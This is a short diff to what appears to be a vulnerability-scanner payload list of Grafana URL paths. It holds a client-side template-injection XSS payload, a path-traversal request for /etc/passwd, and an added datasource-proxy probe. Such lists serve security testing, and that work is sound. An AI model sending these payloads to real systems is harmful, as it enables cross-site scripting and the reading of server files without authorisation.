@@ -1,2 +1,3 @@
 /dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1
 /public/plugins/welcome/../../../../../../../../etc/passwd
+/api/datasources/proxy/1/api/v1/query?query=114*514
